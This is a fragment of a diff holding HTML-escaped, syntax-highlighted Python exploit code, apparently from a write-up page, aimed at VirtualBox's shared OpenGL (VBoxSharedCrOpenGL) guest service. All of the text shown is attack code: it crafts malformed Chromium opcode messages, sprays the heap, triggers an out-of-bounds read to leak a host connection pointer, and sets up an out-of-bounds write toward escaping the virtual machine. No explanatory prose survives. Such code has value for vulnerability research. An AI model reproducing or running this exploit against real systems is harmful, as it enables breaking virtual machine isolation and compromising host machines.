+        &lt;span class=&quot;n&quot;&gt;msg3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;III&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_MESSAGE_OPCODES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CR_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;aaaa&#39;&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_SHADERSOURCE_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
+              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;IIIII&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x260&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
+        &lt;span class=&quot;n&quot;&gt;msg4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make_oob_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x570&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;msg4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;bufs2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;bufs3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;bufs2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;bufs3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        
+    
+        &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_WRITE_READ_BUFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0a0a0000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0a0135&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_WRITE_READ_BUFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufs3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;#self.leak_stuff()&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VBoxSharedCrOpenGL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;set_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;B&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pay2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;C&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x420&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_WRITE_READ_BUFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x42424242&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; 
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x870&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;[*] Leaked conn @ 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%016x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        
+        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdf0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x160&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe30&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x160&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x15c8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
